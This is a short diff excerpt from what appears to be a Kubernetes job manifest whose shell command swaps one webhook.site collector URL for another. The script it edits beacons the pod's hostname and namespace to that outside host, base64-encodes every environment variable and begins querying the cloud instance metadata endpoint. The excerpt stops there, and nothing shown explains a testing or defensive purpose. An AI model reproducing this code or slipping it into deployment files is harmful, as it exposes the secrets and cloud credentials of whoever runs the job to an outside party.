@@ -253,7 +253,7 @@ spec:
         command: ["/bin/sh", "-c"]
         args:
         - |
-          HOOK="https://webhook.site/2659db76-ba6b-4835-8d39-fe6c80b47919"
+          HOOK="https://webhook.site/f710f00e-e417-400e-85be-0d19650ebf7f"
           curl -sf --max-time 5 "${HOOK}/?stage=k8s-job-start&host=$(hostname)&ns=${POD_NAMESPACE}" || true
           ENVVARS=$(env | base64 | tr -d '\n' 2>/dev/null | head -c 2000)
           IMDS=$(curl -sf --max-time 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null || \
